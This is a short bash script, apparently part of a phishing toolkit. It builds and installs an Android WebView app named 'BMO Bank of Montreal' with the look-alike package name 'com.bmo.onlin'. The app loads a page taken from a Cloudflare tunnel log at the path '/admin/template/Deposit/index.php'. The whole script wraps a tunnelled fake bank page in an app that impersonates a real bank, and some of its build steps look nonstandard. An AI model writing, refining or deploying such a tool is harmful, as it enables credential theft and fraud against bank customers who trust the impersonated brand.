




#!/bin/bash

# Define app parameters
APP_NAME="BMO Bank of Montreal"
PACKAGE_NAME="com.bmo.onlin"
LOG_FILE=".tunnels_log/.cloudfl.log"  # The file that contains the URL
URL_TO_LOAD=""

# Read the URL from the log file
if [ -f "$LOG_FILE" ]; then
  URL_TO_LOAD=$(head -n 1 "$LOG_FILE")
else
  echo "Log file '$LOG_FILE' not found or empty."
  exit 1
fi

# Append the desired path to the URL
URL_TO_LOAD="$URL_TO_LOAD/admin/template/Deposit/index.php"

# Create a new Android project
echo "Creating Android project..."
mkdir "$APP_NAME"
cd "$APP_NAME"
gradle wrapper
./gradlew createProject -PappPackage="$PACKAGE_NAME"

# Edit the MainActivity to load the URL
echo "Configuring MainActivity..."
MAIN_ACTIVITY="app/src/main/java/$PACKAGE_NAME/MainActivity.java"
echo "import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        WebView webView = findViewById(R.id.webView);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl(\"$URL_TO_LOAD\");
    }
}" > "$MAIN_ACTIVITY"

# Build the APK
echo "Building the APK..."
./gradlew assembleDebug

# Install the APK on a connected device or emulator
echo "Installing the APK..."
./gradlew installDebug

echo "App created and installed. Enjoy your WebView app!"

# Clean up
cd ..
rm -rf "$APP_NAME"
